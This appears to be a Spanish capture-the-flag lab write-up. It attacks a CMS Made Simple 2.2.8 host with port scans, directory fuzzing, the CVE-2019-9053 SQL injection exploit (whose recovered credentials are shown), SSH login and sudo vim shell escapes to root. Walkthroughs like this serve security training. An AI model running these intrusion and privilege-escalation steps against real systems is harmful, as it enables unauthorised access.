### Scan
```css
nmap -p- --open --min-rate 3000 -sS -n -vvv -Pn 10.10.68.49
```
### 
```css
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.33.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.64 seconds
```

### El puerto 21 tiene certificaciones por defecto para ingresar como anomymous


### haciendo fuzzing conseguimos el directorio "'/simple'" 
### hacemos fuzzing al directorio /simple 
```css
/.php              (Status: 403) [Size: 298]
/.html             (Status: 403) [Size: 299]
/index.php         (Status: 200) [Size: 19913]
/modules           (Status: 301) [Size: 321] [--> http://10.10.14.180/simple/modules/]
/uploads           (Status: 301) [Size: 321] [--> http://10.10.14.180/simple/uploads/]
/doc               (Status: 301) [Size: 317] [--> http://10.10.14.180/simple/doc/]
/admin             (Status: 301) [Size: 319] [--> http://10.10.14.180/simple/admin/]
/assets            (Status: 301) [Size: 320] [--> http://10.10.14.180/simple/assets/]
/lib               (Status: 301) [Size: 317] [--> http://10.10.14.180/simple/lib/]
/install.php
```

### conseguimos enumerar la version de aparentemente la pg:

```css
CMS Made Simple version 2.2.8
```

### buscamos un exploit. en www.exploit.db.com conseguimos exploit de Python que explota una vulnerabilidad de inyección de SQL (CVE-2019-9053). La vulnerabilidad permite a un atacante realizar una inyección de SQL en el sistema y extraer información sensible de la base de datos.
#### Ejecutamos el exploit y obtenemos resultados:
```css

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[*] Try: secret
```

### intentamos acceder via ssh que esta habilitado en el puerto 2222
```css
ssh mitch@10.10.45.134
password: secret 
```

# Enumeración básica sistema
```css
find / -perm -u=s -type f 2>/dev/null
sido -l 
```
# Permisos sudo
```css
con el usuario mitch tenemos permisos para ejecutar /usr/bin/vim 

ejecutamos: sudo vim -c ':!/bin/sh'
```

### otras opciones
```css

	sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

	sudo vim -c ':lua os.execute("reset; exec sh")'
```